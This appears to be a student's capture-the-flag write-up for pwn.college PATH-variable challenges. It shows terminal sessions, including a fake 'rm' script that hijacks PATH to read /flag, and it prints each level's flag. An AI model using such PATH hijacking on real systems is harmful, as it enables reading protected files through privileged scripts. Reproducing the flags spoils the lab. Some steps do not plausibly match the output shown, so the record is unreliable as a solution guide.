# Module 12

## Challenges

## The PATH Variable
```
hacker@path~the-path-variable:~$ PATH=""
hacker@path~the-path-variable:~$ /challenge/run
Trying to remove /flag...
/challenge/run: line 4: rm: No such file or directory
The flag is still there! I might as well give it to you!
pwn.college{4h2U3jWF82l0uOgCLDV0Xn6Qqgf.dZzNwUDL0gTN0czW}
```

## Setting PATH

```
hacker@path~setting-path:~$ echo "/challenge/more_commands/" > win
hacker@path~setting-path:~$ chmod +x win
hacker@path~setting-path:~$ PATH="/challenge/more_commands/"
hacker@path~setting-path:~$ /challenge/run
Invoking 'win'....
Congratulations! You properly set the flag and 'win' has launched!
pwn.college{wTCwYfjTZ0i3ea5VQ1ml2d2s87Z.dVzNyUDL2kjN0czW}
```

## Adding Commands

```
hacker@path~adding-commands:~$ nano win
hacker@path~adding-commands:~$ nano win
hacker@path~adding-commands:~$ chmod +x win
hacker@path~adding-commands:~$ echo $PATH
/run/challenge/bin:/run/workspace/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
hacker@path~adding-commands:~$ PATH="~"
hacker@path~adding-commands:~$ /challenge/run
Invoking 'win'....
pwn.college{A8oJE63WDaMdRJjC1_InKdGq0rO.dZzNyUDL2kjN0czW}
```

## Highjacking Commands

```
hacker@path~hijacking-commands:~$ echo "/run/dojo/bin/cat /flag" > rm
hacker@path~hijacking-commands:~$ chmod +x rm
hacker@path~hijacking-commands:~$ PATH=/home/hacker
hacker@path~hijacking-commands:~$ /challenge/run
Trying to remove /flag...
pwn.college{MOb9H4c_-xvETpt2VHhwOu7l1S3.ddzNyUDL0QjN5YzW}
```
